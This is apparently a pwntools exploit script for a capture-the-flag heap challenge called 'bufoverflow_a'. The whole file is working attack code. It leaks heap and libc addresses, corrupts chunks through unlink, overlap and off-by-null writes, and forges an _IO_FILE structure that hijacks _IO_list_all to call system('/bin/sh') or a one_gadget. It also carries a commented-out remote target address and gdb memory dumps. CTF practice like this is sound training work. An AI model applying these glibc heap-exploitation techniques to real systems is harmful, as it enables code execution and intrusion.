# coding:utf-8
#!/usr/bin/env python2
import copy
from ctypes import *
from pwn import *

p = process('./bufoverflow_a',env={"LD_PRELOAD":"/lib/x86_64-linux-gnu/libc.so.6"})
#p = remote('116.62.152.176',20001)
#context.log_level = 'debug'
libc = ELF("./libc.so.6")
#libc = ELF("./libc-2.24.so")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
 
def delete(id):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(id))

def show():
    p.recvuntil('>> ')
    p.sendline('4')

def fill(data):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil('Content: ')
    p.sendline(data)

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()


#--------leak heap base------------------------

create(0x88)#0
create(0x1000)#1
create(0x500)#2
create(0x88)#3
create(0x88)#4
create(0x88)#5

delete(1)
delete(2)
delete(4)



create(0x88)#1



delete(1)
delete(5)
delete(3)



delete(0)


create(0x98)#0

create(0x88)#1

show()
heap = u64(p.recv(6).ljust(8,'\x00')) - 0xb0

#clear
delete(0)
delete(1)

success('heap_addr:'+hex(heap))

#-------------libc----------------
create(0x88)#0
create(0x300)#1
delete(0)
#context.log_level = 'debug'
create(0x88)#0
show()
data = u64(p.recv(6).ljust(8,'\x00'))
success('data:' + hex(data))

libc_base = data - 0x70 - libc.symbols['__realloc_hook']
malloc_hook = libc_base + libc.symbols['__free_hook']
success('free_hook:'+hex(malloc_hook))


delete(0)
delete(1)

create(0x108)
create(0x108)
create(0xf8)
create(0x88)


delete(1)
create(0x108)

haddr=heap+0x18
fill(p64(0)+p64(0x101)+p64(haddr-0x18)+p64(haddr-0x10)+'a'*0xe0+p64(0x100))

delete(2)

create(0x1f8)
fill(p64(0x41)*0x3e)
delete(1)
delete(0)

create(0x218)
fill('a'*0x118+p64(0x91)+(p64(0x21)*24)[:-1])
delete(3)

delete(2)
create(0x88)

delete(0)
delete(1)


io_list_all_addr = libc_base + libc.symbols['_IO_list_all']
jump_table_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xc0

create(0x218)
file_struct = p64(0)+p64(0x61)+p64(data)+p64(io_list_all_addr - 0x10)+p64(2)+p64(3)

file_struct = file_struct.ljust(0xd8, "\x00")
file_struct += p64(jump_table_addr)
file_struct += p64(libc_base + 0x3f52a)


fill('a'*0x110+file_struct)
z()
print(hex(libc_base+0x3f52a))
p.interactive()



#-------------init----------------
create(0x88)#2
create(0x88)#3

#-----------off by null-------------
delete(1)
delete(0)
create(0x88)#0
fill('\x00'*0x88)

#----------chunk overlap--------
create(0x88)#1
create(0x88)#4 0x55e6b0863140:	0x90	0x90
create(0x88)#5


delete(1)
delete(2)

#-----------leak libc----------------
create(0x388)#1


#delete(4)


pay = ''
pay += '\xcc'*0x80
pay += p64(0) + p64(0x91)
pay += '\xcc'*0x80
pay += p64(0) + p64(0x91)
pay += '\xcc'*0x80
pay += p64(0) + p64(0x91)
pay += '\x00'*0x80
pay += p64(0) + p64(0x91)

fill(pay)

#delete(3)
#delete(0)delete(5)
delete(5)
delete(1)
#create(0x388)#1

#delete(4)

#create(0x100)#2

z()
_IO_str_jumps = libc_base  + libc.symbols['_IO_file_jumps'] + 0xc0 
system = libc_base + libc.symbols['system']
_IO_list_all = libc_base + libc.symbols['_IO_list_all']
binsh = libc_base + libc.search('/bin/sh\x00').next()
success('_IO_str_jumps:'+hex(_IO_str_jumps))
success('system:'+hex(system))
success('_IO_list_all:'+hex(_IO_list_all))
success('binsh:'+hex(binsh))


z()

from FILE import *
context.arch = 'amd64'

payload = 'a'*0x80

fake_file = IO_FILE_plus_struct()
fake_file._flags = 0
fake_file._IO_read_ptr = 0x61
fake_file._IO_read_base =_IO_list_all-0x10
fake_file._IO_buf_base = binsh
fake_file._mode = 0
fake_file._IO_write_base = 0
fake_file._IO_write_ptr = 1
fake_file.vtable = _IO_str_jumps-8

payload += str(fake_file).ljust(0xe8,'\x00')+p64(system)

fill(payload)

z()

#context.log_level = 'debug'
#p.interactive()

delete(1)
create(0x288)#1

z()







'''
0x5589c85ab0c0:	0x5589c85ab1d0	0x7ff706cf3b58
0x5589c85ab0d0:	0xcccccccccccccccc	0xcccccccccccccccc
0x5589c85ab0e0:	0xcccccccccccccccc	0xcccccccccccccccc
0x5589c85ab0f0:	0xcccccccccccccccc	0xcccccccccccccccc
0x5589c85ab100:	0xcccccccccccccccc	0xcccccccccccccccc
0x5589c85ab110:	0xcccccccccccccccc	0xcccccccccccccccc
0x5589c85ab120:	0xcccccccccccccccc	0xcccccccccccccccc
0x5589c85ab130:	0xcccccccccccccccc	0xcccccccccccccccc
0x5589c85ab140:	0x90	0x90
0x5589c85ab150:	0x0	0x0
0x5589c85ab160:	0x0	0x0
0x5589c85ab170:	0x0	0x0
0x5589c85ab180:	0x0	0x0
0x5589c85ab190:	0x0	0x0
0x5589c85ab1a0:	0x0	0x0
0x5589c85ab1b0:	0x0	0x0
0x5589c85ab1c0:	0x0	0x0
0x5589c85ab1d0:	0x0	0xe1
'''

'''
0x56159e9240b0:	0x0	0x2a1
0x56159e9240c0:	0x56159e9241d0	0x7f0312a40b58
0x56159e9240d0:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e9240e0:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e9240f0:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924100:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924110:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924120:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924130:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924140:	0x90	0x90
0x56159e924150:	0x0	0x0
0x56159e924160:	0x0	0x0
0x56159e924170:	0x0	0x0
0x56159e924180:	0x0	0x0
0x56159e924190:	0x0	0x0
0x56159e9241a0:	0x0	0x0
0x56159e9241b0:	0x0	0x0
0x56159e9241c0:	0x0	0x0
0x56159e9241d0:	0x0	0xe1
0x56159e9241e0:	0x7f0312a40b58	0x56159e9240b0
0x56159e9241f0:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924200:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924210:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924220:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924230:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924240:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924250:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924260:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924270:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924280:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e924290:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e9242a0:	0xcccccccccccccccc	0xcccccccccccccccc
0x56159e9242b0:	0xe0	0xcccccccccccccccc
0x56159e9242c0:	0x210	0x90
'''


